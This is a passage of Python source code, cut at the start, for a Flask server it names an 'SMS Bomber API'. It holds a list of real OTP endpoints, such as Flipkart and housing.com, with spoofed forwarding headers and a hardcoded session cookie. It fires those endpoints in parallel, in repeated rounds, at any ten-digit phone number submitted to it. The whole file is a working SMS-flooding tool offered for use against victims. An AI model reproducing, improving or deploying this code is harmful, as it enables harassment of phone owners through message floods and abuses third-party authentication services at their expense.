                "Cookie": "PHPSESSID=8trla61rg1ong40jfipnbkgbo2; searchReport-log=0; n7HDToken=d+IZAKbE68OGf8+MM3jp90Mh6Q7BsnSBnMQErzL+ViPGD2mROvGr8S/f/qo7gEEdKNx/7TbxOIKo/VLu3jyj1plDFiAxE5Gc3j24XaWSb7MUbgXOEq+MYK8gnkV3fuQb9nQEzNtrCfWu17tUGSJnbWaPF4OVHNTvPbpwT5KFt1Y=; _fbp=fb.1.1745237999949.310699470488280662; _gcl_au=1.1.1379491012.1745238000; form_key=BGrEvqqhl0ydIR8q; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; mage-messages=; _ga=GA1.2.1310867166.1745238001; _gid=GA1.2.1539797096.1745238002; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; twk_idm_key=2gFbbj1GW6XCnip5ilOxx; TawkConnectionTime=0; _ga_GQ7J3T0PJB=GS1.1.1745238000.1.1.1745238019.41.0.0; private_content_version=e5dc03e8bc555ce39375a87c1f3e5089; section_data_ids=%7B%22cart%22%3A1745238010%2C%22customer%22%3A1745238010%2C%22compare-products%22%3A1745238010%2C%22last-ordered-items%22%3A1745238010%2C%22directory-data%22%3A1745238010%2C%22captcha%22%3A1745238010%2C%22instant-purchase%22%3A1745238010%2C%22loggedAsCustomer%22%3A1745238010%2C%22persistent%22%3A1745238010%2C%22review%22%3A1745238010%2C%22wishlist%22%3A1745238010%2C%22ammessages%22%3A1745238010%2C%22bss-fbpixel-atc%22%3A1745238010%2C%22bss-fbpixel-subscribe%22%3A1745238010%2C%22chatData%22%3A1745238010%2C%22recently_viewed_product%22%3A1745238010%2C%22recently_compared_product%22%3A1745238010%2C%22product_data_storage%22%3A1745238010%7D",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://login.housing.com/api/v2/send-otp",
            "method": "POST",
            "payload": {"phone": phone_number},
            "headers": {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                "Content-Type": "application/json",
                "Origin": "https://login.housing.com",
                "Referer": "https://login.housing.com/",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://www.flipkart.com/api/5/user/otp/generate",
            "method": "POST",
            "payload": {"loginId": f"+91{phone_number}"},
            "headers": {
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Accept": "*/*",
                "Origin": "https://www.flipkart.com",
                "Referer": "https://www.flipkart.com/",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        }
    ]

async def send_otp_requests(phone_number, ip_address, rounds=1, silent=True):
    apis = get_apis_list(phone_number, ip_address)
    
    success_count = 0
    failed_count = 0
    success_apis = []
    failed_apis = []
    
    # Ultra-fast connection pooling with optimized settings
    connector = aiohttp.TCPConnector(
        limit=200,  # Max total connections
        limit_per_host=50,  # Max connections per host
        ttl_dns_cache=300,  # DNS cache TTL
        force_close=False,  # Keep connections alive
        enable_cleanup_closed=True,  # Auto cleanup
        keepalive_timeout=30  # Keep connections alive for 30s
    )
    
    # Optimized timeout for session
    timeout = aiohttp.ClientTimeout(total=2, connect=0.5, sock_read=1.5)
    
    async with aiohttp.ClientSession(
        connector=connector,
        timeout=timeout,
        headers={'Connection': 'keep-alive'}
    ) as session:
        for round_num in range(rounds):
            # Execute all requests in parallel - ULTRA FAST
            tasks = [send_request(session, api, phone_number, ip_address, silent=silent) for api in apis]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                if isinstance(result, Exception):
                    failed_count += 1
                    continue
                
                status_code, api = result
                if status_code is None:
                    failed_count += 1
                    continue
                
                endpoint_str = api["endpoint"](phone_number) if callable(api["endpoint"]) else api["endpoint"]
                api_name = endpoint_str.split("//")[1].split("/")[0] if "//" in endpoint_str else endpoint_str
                
                if status_code in [200, 201, 202]:
                    success_count += 1
                    if not any(s["api"] == api_name for s in success_apis):
                        success_apis.append({"api": api_name, "endpoint": endpoint_str, "status": status_code})
                else:
                    failed_count += 1
                    if not any(f["api"] == api_name for f in failed_apis):
                        failed_apis.append({"api": api_name, "endpoint": endpoint_str, "status": status_code})
            
            # Minimal delay between rounds for maximum speed
            if round_num < rounds - 1:
                await asyncio.sleep(0.1)  # Reduced from 0.5 to 0.1 seconds
    
    return {
        "success_count": success_count,
        "failed_count": failed_count,
        "total_apis": len(apis),
        "success_apis": success_apis,
        "failed_apis": failed_apis
    }

# Flask App
app = Flask(__name__)

@app.route('/')
def home():
    return jsonify({
        "message": "SMS Bomber API",
        "endpoints": {
            "/send/<phone_number>": "Send OTP to phone number (10 digits without +91)",
            "/send?phone=<phone_number>": "Send OTP via query parameter"
        },
        "example": "/send/8789977777"
    })

@app.route('/send/<phone_number>', methods=['GET', 'POST'])
def send_otp(phone_number):
    try:
        # Validate phone number
        if not phone_number.isdigit() or len(phone_number) != 10:
            return jsonify({
                "success": False,
                "error": "Invalid phone number! Must be 10 digits without +91",
                "phone": phone_number
            }), 400
        
        ip_address = request.remote_addr or "192.168.1.1"
        rounds = int(request.args.get('rounds', 1))
        
        if rounds < 1 or rounds > 10:
            rounds = 1
        
        # Run async function
        try:
            try:
                loop = asyncio.get_event_loop()
                if loop.is_closed():
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
            except RuntimeError:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
            
            result = loop.run_until_complete(send_otp_requests(phone_number, ip_address, rounds))
        except Exception as e:
            return jsonify({
                "success": False,
                "error": f"Failed to send OTP requests: {str(e)}",
                "phone": phone_number
            }), 500
        
        return jsonify({
            "success": True,
            "phone": phone_number,
            "total_apis": result["total_apis"],
            "success_count": result["success_count"],
            "failed_count": result["failed_count"],
            "success_apis": result["success_apis"],
            "failed_apis": result["failed_apis"]
        })
    
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e),
            "phone": phone_number
        }), 500

@app.route('/send', methods=['GET', 'POST'])
def send_otp_query():
    phone_number = request.args.get('phone') or (request.json.get('phone') if request.is_json else None)
    
    if not phone_number:
        return jsonify({
            "success": False,
            "error": "Phone number required! Use /send/<phone_number> or /send?phone=<phone_number>"
        }), 400
    
    return send_otp(phone_number)

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    print("=" * 50)
    print("SMS Bomber API Server")
    print("Made By luci savex Anonymous")
    print("=" * 50)
    print("\nAPI Endpoints:")
    print(f"  GET/POST http://localhost:{port}/send/<phone_number>")
    print(f"  GET/POST http://localhost:{port}/send?phone=<phone_number>")
    print("\nExample:")
    print(f"  http://localhost:{port}/send/8789997777")
    print(f"  http://localhost:{port}/send?phone=8384884484&rounds=1")
    print(f"\nStarting server on http://0.0.0.0:{port}\n")
    app.run(host='0.0.0.0', port=port, debug=False)
    